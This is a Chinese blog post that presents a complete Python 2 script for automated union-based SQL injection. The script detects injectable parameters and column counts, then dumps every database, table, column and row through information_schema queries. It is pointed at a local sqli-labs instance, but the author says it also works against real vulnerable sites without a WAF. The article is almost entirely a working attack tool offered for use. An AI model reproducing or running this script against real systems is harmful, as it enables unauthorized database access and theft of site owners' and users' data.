<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.9.0">
    <meta http-equiv="Content-Language" content="zh-cn">
    <meta charset="utf-8">
    
    
    
    <title>python脚本之联合注入脚本 | oxxk blog</title>
    <meta name="viewport" content="width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
    
    <meta name="theme-color" content="#77AAFF">
    
    
    <meta name="keywords" content>
    
    

    

    <!-- Baidu Push -->
<script>
	(function(){
		var bp = document.createElement('script');
		var curProtocol = window.location.protocol.split(':')[0];
		if (curProtocol === 'https') {
			bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
		}
		else {
			bp.src = 'http://push.zhanzhang.baidu.com/push.js';
		}
		var s = document.getElementsByTagName("script")[0];
		s.parentNode.insertBefore(bp, s);
	})();

	var _hmt = _hmt || [];
</script>



    
    <meta name="description" content="此脚本能实现最基础的联合查询注入。">
<meta property="og:type" content="article">
<meta property="og:title" content="python脚本之联合注入脚本">
<meta property="og:url" content="https://0xxk.github.io/2019/09/01/python脚本之联合查询/index.html">
<meta property="og:site_name" content="oxxk blog">
<meta property="og:description" content="此脚本能实现最基础的联合查询注入。">
<meta property="og:locale" content="en">
<meta property="og:updated_time" content="2019-09-07T16:10:30.293Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="python脚本之联合注入脚本">
<meta name="twitter:description" content="此脚本能实现最基础的联合查询注入。">
    
        <link rel="alternate" type="application/atom+xml" title="oxxk blog" href="/atom.xml">
    
    <link rel="shortcut icon" href="/img/favicon.ico">
    <link id="style" rel="stylesheet" href="/css/style.css?v=3.0">
    <script>window.lazyScripts=[]</script>

    <!-- custom head -->
    
            
</head>

<body>
    <div id="loading" class="active"></div>
    <aside id="menu"  class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap" >
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg" alt="avatar">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname" id="name">0xxk</h5>
          
            <div id="yiyanmotto" class="motto">&nbsp;</div>
          
        </hgroup>
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
              <li class="waves-block waves-effect">
                  <a href="/"  >
                    <i class="icon icon-lg icon-home"></i>
                    <span>主 页</span><i class="icon icon-lg icon-caret-left"></i>
                  </a>
              </li>
            
              <li class="waves-block waves-effect">
                  <a href="/archives"  >
                    <i class="icon icon-lg icon-archives"></i>
                    <span>归 档</span><i class="icon icon-lg icon-caret-left"></i>
                  </a>
              </li>
            
              <li class="waves-block waves-effect">
                  <a href="/categories"  >
                    <i class="icon icon-lg icon-th-list"></i>
                    <span>分 类</span><i class="icon icon-lg icon-caret-left"></i>
                  </a>
              </li>
            
              <li class="waves-block waves-effect">
                  <a href="/tags"  >
                    <i class="icon icon-lg icon-tags"></i>
                    <span>标 签</span><i class="icon icon-lg icon-caret-left"></i>
                  </a>
              </li>
            
              <li class="waves-block waves-effect">
                  <a href="/about"  >
                    <i class="icon icon-lg icon-smile-o"></i>
                    <span>关 于</span><i class="icon icon-lg icon-caret-left"></i>
                  </a>
              </li>
            
      <div class="nav2">
          
              <a class="nav2item" data-title="Github" href="https://github.com/oxxk" target="_blank"title="Github" >
                <i class="icon icon-lg icon-github github"></i>
              </a>
          

            </div>
        
      </ul>
        
    </div>
  </div>
 
</aside>


    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">python脚本之联合注入脚本</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="icon icon-lg icon-search"></i>
            </a>
        </div>
        
        <a href="../../atom.xml" target="_blank" class="header-icon waves-effect waves-circle waves-light" id="Rss">
            <i class="icon icon-lg icon-rss"></i>
        </a>
    </div>
</header>
<header class="content-header post-header">
    
    
    <div class="container fade-scale">
        <div id="myheader">
            <h1 class="title">
                
            </h1>
            <h5 class="subtitle">
                
                
            </h5>
        </div>
    </div>

</header>


<div class="container body-wrap">
    
<article id="post-python脚本之联合查询"
  class="post-article article-type-post fade" itemprop="blogPost">

    <div class="post-card">
        <h1 class="post-card-title">python脚本之联合注入脚本</h1>
        <div class="post-meta">
            <i class="icon icon-lg icon-calendar-o"></i>
            发表于
            <time class="post-time" title="2019-09-01 17:38:09" datetime="2019-09-01T09:38:09.952Z"  itemprop="datePublished">2019-09-01</time>

            <br id="mybreak"/>
            
<script>
	mybreak.style="display:none";
</script>


            <i>·</i>
            
<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>次浏览
</span>


        </div>
        <div class="post-count-custom">
            <i class="icon icon-lg icon-comment-o"></i>
            阅读本文可能花费您&nbsp;<span class="post-count">6</span>&nbsp;分钟
        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            <p>此脚本能实现最基础的联合查询注入。</p>
<a id="more"></a>

<p>此脚本不仅能在mysql-sqli1-5关中使用之外，还可以在一般的无WAF且有回显的漏洞网站中使用。可以自动判断截断符号，自动跑出所有的数据。</p>
<p>脚本如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br></pre></td><td class="code"><pre><span class="line"># coding=UTF-8</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding( &quot;utf-8&quot; )</span><br><span class="line"></span><br><span class="line"># 验证是否有注入</span><br><span class="line">def yanzhengceshi(url,html_text1):</span><br><span class="line">    global jieduan</span><br><span class="line">    zhushifu = [&apos;%23&apos;, &apos;--+&apos;]</span><br><span class="line">    for i in zhushifu:</span><br><span class="line">        xurl = url + i</span><br><span class="line">        print xurl</span><br><span class="line">        rurl_text = requests.get(xurl)</span><br><span class="line">        html_text3 = len(rurl_text.text)</span><br><span class="line">        print html_text3</span><br><span class="line">        rurl_base = base64.b64encode(rurl_text.text)</span><br><span class="line"></span><br><span class="line">        html_chaju = abs(html_text1 - html_text3)</span><br><span class="line">        if (html_chaju &lt; 8 ):</span><br><span class="line">            jieduan[1] = i</span><br><span class="line">            print xurl</span><br><span class="line">            return xurl</span><br><span class="line"></span><br><span class="line"># 找到报错点</span><br><span class="line">def ceshi():</span><br><span class="line">    global start_url, i, lists, jieduan</span><br><span class="line">    global jieduan</span><br><span class="line"></span><br><span class="line">    # 最初始的URL请求信息</span><br><span class="line">    start_url_text = requests.get(start_url)</span><br><span class="line"></span><br><span class="line">    print start_url</span><br><span class="line"></span><br><span class="line">    html_text1 = len(start_url_text.text)</span><br><span class="line">    print html_text1</span><br><span class="line"></span><br><span class="line">    start_url_base = base64.b64encode(start_url_text.text)</span><br><span class="line">    # 截断后的信息</span><br><span class="line">    url = start_url + i</span><br><span class="line"></span><br><span class="line">    url2 = url + &apos; and 1=2&apos;</span><br><span class="line">    print url</span><br><span class="line">    url_text = requests.get(url2)</span><br><span class="line">    print url2</span><br><span class="line">    html_text2 = len(url_text.text)</span><br><span class="line"></span><br><span class="line">    print html_text2</span><br><span class="line">    url_base = base64.b64encode(url_text.text)</span><br><span class="line"></span><br><span class="line">    jieguo = yanzhengceshi(url,html_text1)</span><br><span class="line"></span><br><span class="line">    html_chaju = abs(html_text1 - html_text2)</span><br><span class="line">    print html_chaju</span><br><span class="line">    if (html_chaju &gt; 15) and jieguo:</span><br><span class="line">        print jieguo</span><br><span class="line">        lists.append(jieguo)</span><br><span class="line">        print &quot;i==&#123;&#125;&quot;.format(i)</span><br><span class="line">        jieduan[0] = i</span><br><span class="line"></span><br><span class="line"># 拼接截断字符</span><br><span class="line">def testsql():</span><br><span class="line">    global start_url</span><br><span class="line">    global start_url, i, lists, jieduan</span><br><span class="line">    lists = []</span><br><span class="line">    jieduan = [&apos;&apos;, &apos;&apos;]</span><br><span class="line">    playload = [&quot;\&apos;&quot;, &quot;\&apos;)&quot;, &quot;\&quot;&quot;, &quot;\&quot;)&quot;, &quot;&quot;]</span><br><span class="line">    for i in playload:</span><br><span class="line">        ceshi()</span><br><span class="line">        print i</span><br><span class="line">    print lists</span><br><span class="line">    if lists:</span><br><span class="line">        print &quot;[!]存在注入，注入点为&#123;&#125;&quot;.format(lists[0])</span><br><span class="line">        return jieduan</span><br><span class="line">    else:</span><br><span class="line">        print &quot;[!]不存在注入，程序退出&quot;</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"># 查询字段位数</span><br><span class="line">def chaziduanqingqiu(czdqq_url):</span><br><span class="line">    shuju = requests.get(czdqq_url)</span><br><span class="line">    html_text4 = len(shuju.text)</span><br><span class="line">    return html_text4</span><br><span class="line"></span><br><span class="line"># 拼接字段位数</span><br><span class="line">def chaziduan():</span><br><span class="line">    global start_url, jieduan</span><br><span class="line">    # print &quot;截断&#123;&#125;&quot;.format(jieduan[0])</span><br><span class="line">    chushi = &apos;&apos;</span><br><span class="line">    czd_url = start_url</span><br><span class="line">    ziduanshu = []</span><br><span class="line">    zhuruziduan = []</span><br><span class="line">    print &quot;截断[0]为&#123;&#125;&quot;.format(jieduan[0])</span><br><span class="line"></span><br><span class="line">    for i in range(1, 15):</span><br><span class="line">        czd_url = start_url + jieduan[0] + &apos; order by &apos; + str(i) + jieduan[1]</span><br><span class="line">        print czd_url</span><br><span class="line">        print i</span><br><span class="line">        shuzhi = chaziduanqingqiu(czd_url)</span><br><span class="line">        ziduanshu.append(shuzhi)</span><br><span class="line">        print ziduanshu</span><br><span class="line"></span><br><span class="line">    for i in range(len(ziduanshu) - 1):</span><br><span class="line">        if (abs(ziduanshu[i]-ziduanshu[i+1]) &gt; 5):</span><br><span class="line">            print &quot;[!]注入字段数为&#123;&#125;&quot;.format(i + 1)</span><br><span class="line">            zhuruziduan.append(i + 1)</span><br><span class="line"></span><br><span class="line">    print ziduanshu</span><br><span class="line">    return zhuruziduan</span><br><span class="line"></span><br><span class="line"># 查询显示位</span><br><span class="line">def chaxianshiweiqingqiu(strings, liebiao):</span><br><span class="line">    shuju = requests.get(url=strings)</span><br><span class="line">    xiabiao = []</span><br><span class="line">    print shuju.text</span><br><span class="line"></span><br><span class="line">    for i in range(len(liebiao)):</span><br><span class="line">        r = r&quot;[^&apos;]0xxk&#123;&#125;[^&apos;]&quot;.format(i)</span><br><span class="line">        print r</span><br><span class="line">        jieguo = re.search(r, shuju.text)</span><br><span class="line">        print jieguo</span><br><span class="line">        if jieguo:</span><br><span class="line">            print i</span><br><span class="line">            xiabiao.append(i)</span><br><span class="line">        print xiabiao</span><br><span class="line">    print &quot;---&quot;</span><br><span class="line">    return xiabiao</span><br><span class="line"></span><br><span class="line"># 拼接显示位</span><br><span class="line">def chaxianshiwei():</span><br><span class="line">    global start_url, ziduan, jieduan,xunhuanziduan</span><br><span class="line">    print &quot;[!]可注入的下标为:&quot;,</span><br><span class="line">    chushi_url = start_url</span><br><span class="line">    xianshiziduan = ziduan</span><br><span class="line">    xiabiao = []</span><br><span class="line"></span><br><span class="line">    for m in xianshiziduan:</span><br><span class="line">        liebiao = []</span><br><span class="line">        MC = &apos;&apos;</span><br><span class="line">        stringS = &apos;&apos;</span><br><span class="line">        strings = &apos;&apos;</span><br><span class="line">        for i in range(m):</span><br><span class="line">            MC = &apos;0xxk&apos; + str(i)</span><br><span class="line">            mingcheng = MC</span><br><span class="line">            liebiao.append(mingcheng)</span><br><span class="line">            stringS += &apos;\&apos;&apos; + mingcheng + &apos;\&apos;&apos;</span><br><span class="line">            strings = stringS</span><br><span class="line">            stringS += &apos;,&apos;</span><br><span class="line">        strings = start_url + jieduan[0] + &quot; and 1=2 union select &quot; + strings + jieduan[1]</span><br><span class="line">        print strings</span><br><span class="line">        print &apos;666&apos;</span><br><span class="line">        print liebiao</span><br><span class="line">        xiabiao = chaxianshiweiqingqiu(strings, liebiao)</span><br><span class="line"></span><br><span class="line">        if not xiabiao:</span><br><span class="line">            continue</span><br><span class="line">        xunhuanziduan = len(liebiao)</span><br><span class="line">        print len(liebiao)</span><br><span class="line">        print &quot;12345&quot;</span><br><span class="line">        for i in range(len(xiabiao)):</span><br><span class="line">            print &quot;&#123;&#125;&quot;.format(xiabiao[i]),</span><br><span class="line"></span><br><span class="line">    return xiabiao</span><br><span class="line"></span><br><span class="line"># 在这里取出爆破出的数据</span><br><span class="line">def zongchaxun(ChuShi_url):</span><br><span class="line">    shuju = requests.get(url=ChuShi_url)</span><br><span class="line">    r = r&quot;\*&#123;3&#125;([^,]*)\*&#123;3&#125;&quot;</span><br><span class="line"></span><br><span class="line">    CXlist = re.findall(r, shuju.text)</span><br><span class="line">    for i in range(len(CXlist)):</span><br><span class="line">        CXlist[i] = str(CXlist[i])</span><br><span class="line">    return CXlist</span><br><span class="line"></span><br><span class="line"># 在这里拼接所有的PlayLoad</span><br><span class="line">def pingjiePL(yuju):</span><br><span class="line">    global start_url, jieduan, xunhuanziduan, xiabiao</span><br><span class="line">    chushi_url = start_url + jieduan[0] + &quot; and 1=2&quot; + &quot; union select &quot;</span><br><span class="line">    for i in range(int(xunhuanziduan)):</span><br><span class="line">        if i == xiabiao[0]:</span><br><span class="line">            chushi_url += yuju</span><br><span class="line">        else:</span><br><span class="line">            chushi_url += str(i)</span><br><span class="line">            ChuShi_url = chushi_url</span><br><span class="line">            chushi_url += &apos;,&apos;</span><br><span class="line">    print &apos;\n&apos;,</span><br><span class="line">    ChuShi_url += &quot; &quot; + jieduan[1]</span><br><span class="line">    print ChuShi_url</span><br><span class="line">    list = zongchaxun(ChuShi_url)</span><br><span class="line">    return list</span><br><span class="line"></span><br><span class="line"># 开始暴库</span><br><span class="line">def baoku():</span><br><span class="line">    global start_url, xunhuanziduan, xiabiao</span><br><span class="line">    global jieduan</span><br><span class="line">    yuju = &quot;(select group_concat(&apos;***&apos;,schema_name,&apos;***,&apos;) from information_schema.schemata),&quot;</span><br><span class="line">    playload_ku = pingjiePL(yuju)</span><br><span class="line">    if playload_ku:</span><br><span class="line">        print &quot;网站数据库有:&quot;</span><br><span class="line">        for i in playload_ku:</span><br><span class="line">            print i</span><br><span class="line">        return playload_ku</span><br><span class="line">    else:</span><br><span class="line">        print &quot;网站没有数据库&quot;</span><br><span class="line"></span><br><span class="line"># 开始爆表</span><br><span class="line">def baobiao():</span><br><span class="line">    global start_url, xunhuanziduan, xiabiao, table_schema</span><br><span class="line">    global jieduan</span><br><span class="line"></span><br><span class="line">    yuju = &quot;(select group_concat(&apos;***&apos;,table_name,&apos;***,&apos;) from information_schema.tables where table_schema=&apos;&quot; + table_schema + &quot;\&apos;),&quot;</span><br><span class="line">    playload_tables = pingjiePL(yuju)</span><br><span class="line"></span><br><span class="line">    if playload_tables:</span><br><span class="line">        print  &quot;&#123;&#125;数据库有如下表:&quot;.format(table_schema)</span><br><span class="line">        for i in playload_tables:</span><br><span class="line">            print i</span><br><span class="line">        return playload_tables</span><br><span class="line">    else:</span><br><span class="line">        print &quot;&#123;&#125;没有表&quot;.format(table_schema)</span><br><span class="line"></span><br><span class="line"># 开始爆字段</span><br><span class="line">def baoziduan():</span><br><span class="line">    global start_url, xunhuanziduan, table_schema, xiabiao, table_name</span><br><span class="line">    global jieduan</span><br><span class="line"></span><br><span class="line">    yuju = &quot;(select group_concat(&apos;***&apos;,column_name,&apos;***,&apos;) from information_schema.columns where table_name=&apos;&#123;&#125;&apos; and table_schema=&apos;&#123;&#125;&apos;),&quot;.format(</span><br><span class="line">        table_name, table_schema)</span><br><span class="line"></span><br><span class="line">    playload_columns = pingjiePL(yuju)</span><br><span class="line">    print len(playload_columns)</span><br><span class="line">    if playload_columns:</span><br><span class="line">        print  &quot;&#123;&#125;数据库有如下字段:&quot;.format(table_name)</span><br><span class="line">        for i in playload_columns:</span><br><span class="line">            print i</span><br><span class="line">        return playload_columns</span><br><span class="line">    else:</span><br><span class="line">        print &quot;&#123;&#125;没有字段&quot;.format(table_name)</span><br><span class="line"></span><br><span class="line"># 开始爆数据</span><br><span class="line">def baoshuju():</span><br><span class="line">    global xunhuanziduan, table_name, table_schema, xiabiao, column_name</span><br><span class="line">    global start_url</span><br><span class="line">    global jieduan</span><br><span class="line"></span><br><span class="line">    yuju = &quot;(select group_concat(&quot;</span><br><span class="line">    yuju_One = yuju</span><br><span class="line"></span><br><span class="line">    for i in range(len(column_name)):</span><br><span class="line">        yuju_One += &quot;&apos;***&apos;,&#123;&#125;,&apos;***,&apos;&quot;.format(column_name[i])</span><br><span class="line">        yuju = yuju_One</span><br><span class="line">        yuju_One += &apos;,&apos;</span><br><span class="line">    yuju += &quot;) from &#123;&#125;.&#123;&#125;),&quot;.format(table_schema, table_name)</span><br><span class="line"></span><br><span class="line">    playload_shuju = pingjiePL(yuju)</span><br><span class="line"></span><br><span class="line">    for i in range(len(playload_shuju)):</span><br><span class="line">        if i % len(column_name) == 0:</span><br><span class="line">            print &apos;\n&apos;,</span><br><span class="line">        print playload_shuju[i],&apos;::&apos;,</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    global start_url, ziduan, xiabiao, jieduan, table_schema, table_name, column_name, xunhuanziduan</span><br><span class="line">    start_url = &quot;http://192.168.107.128/sqli/Less-1/?id=1&quot;</span><br><span class="line"></span><br><span class="line">    jieduan = testsql()  # 截断字符</span><br><span class="line">    print &quot;总的截断为&#123;&#125;&quot;.format(jieduan)</span><br><span class="line">    ziduan = chaziduan()  # 有多少显示位</span><br><span class="line">    print ziduan</span><br><span class="line">    print &apos;1111111&apos;</span><br><span class="line">    xiabiao = chaxianshiwei()  # 显示位下标</span><br><span class="line">    print &quot;可显示下标为&#123;&#125;&quot;.format(xiabiao)</span><br><span class="line">    print &quot;有&#123;&#125;位显示位&quot;.format(xunhuanziduan)</span><br><span class="line">    playload_ku = baoku()  # 爆出的数据库</span><br><span class="line"></span><br><span class="line">    table_schema = raw_input(&quot;请输入要爆的数据库名&quot;)</span><br><span class="line"></span><br><span class="line">    playload_tables = baobiao()  # 爆出的表</span><br><span class="line"></span><br><span class="line">    table_name = &quot;servers&quot;</span><br><span class="line"></span><br><span class="line">    playload_columns = baoziduan()  # 爆出的字段</span><br><span class="line"></span><br><span class="line">    column_name = playload_columns</span><br><span class="line"></span><br><span class="line">    playload_shuju = baoshuju()  # 爆出的数据</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>


        </div>

        <blockquote class="post-copyright">
    <div class="content">
        
<span class="post-time">
    Last updated: <time datetime="2019-09-07T16:10:30.293Z" itemprop="dateUpdated">2019-09-08 00:10:30</time>
</span>


        
        原文链接：<a href="/2019/09/01/python脚本之联合查询/" target="_blank" rel="external">https://0xxk.github.io/2019/09/01/python脚本之联合查询/</a>
        
    </div>
    <footer>
        <div onclick="location.href='https://0xxk.github.io'">
            <img src="/img/avatar.jpg" alt="0xxk">
            <a>0xxk</a>
        </div>
    </footer>
</blockquote>

        
    <div class="page-reward">
        <nav class="myreward">
            <a id="rewardBtn" href="javascript:;"><span>打&nbsp;赏</span><span>装成好像很多人打赏的样子</span></a>
        </nav>
    </div>



        <div class="post-footer">
            

            
<div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://0xxk.github.io/2019/09/01/python脚本之联合查询/&title=《python脚本之联合注入脚本》 — oxxk blog&pic=https://0xxk.github.io/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://0xxk.github.io/2019/09/01/python脚本之联合查询/&title=《python脚本之联合注入脚本》 — oxxk blog&source=此脚本能实现最基础的联合查询注入。" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://0xxk.github.io/2019/09/01/python脚本之联合查询/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《python脚本之联合注入脚本》 — oxxk blog&url=https://0xxk.github.io/2019/09/01/python脚本之联合查询/&via=https://0xxk.github.io" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://0xxk.github.io/2019/09/01/python脚本之联合查询/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>



        </div>
    </div>

    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="waves-block waves-effect prev">
      <a href="/2019/09/01/python脚本之布尔盲注/" id="post-prev" class="post-nav-link">
        <h4 class="title" >
          上一篇：python脚本之盲注脚本
        </h4>
      </a>
    </div>
  

  
    <div class="waves-block waves-effect next">
      <a href="/2019/08/21/burp绕过token验证/" id="post-next" class="post-nav-link">
        <h4 class="title" data-hover="下一篇：burp绕过token验证">下一篇：burp绕过token验证</h4>
      </a>
    </div>
  
</nav>



    
    

    

    


</article>

</div>

        <footer class="footer">
    <div class="footer-content">
        <span class="power">
            <i class="icon icon-lg icon-copyright"></i>
            2017
            <i class="icon icon-lg icon-heart"></i>
            <a href="https://0xxk.github.io">tomotoes.com</a>
            <br/>
            Power by
            <a href="https://hexo.io/" target="_blank" rel="external nofollow">Hexo</a>&nbsp;·&nbsp;
            Theme
            <a class="tomotoeslink" href="https://github.com/tomotoes/hexo-theme-tomotoes/" target="_blank" rel="external nofollow">tomotoes</a>
        </span>

        <br/>

        <span id="RunTime" style="color:#a7a7a2;"></span>
        <br/>

        <span>
            
	<i class="icon icon-lg icon-user">
<span id="busuanzi_container_site_uv" style='display:none'>
       访问用户：<span id="busuanzi_value_site_uv"></span>
    </span>人</i>
    ·
    <i class="icon icon-lg icon-eye">
    <span id="busuanzi_container_site_pv" style='display:none'>
      访问次数：<span id="busuanzi_value_site_pv"></span>
    </span>次
    </i>


        </span>
        <br/>

        <span class="license">This blog is licensed under a <a rel="license" rel="external nofollow" href="https://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International License</a>.</span>
    </div>
</footer>

    </main>
    
        
<div id="reward" class="page-modal reward-lay">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <h3 class="reward-title">
        <i class="icon icon-quote-left"></i>
        <span>感谢您的鼓励支持！</span>
        <i class="icon icon-quote-right"></i>
    </h3>
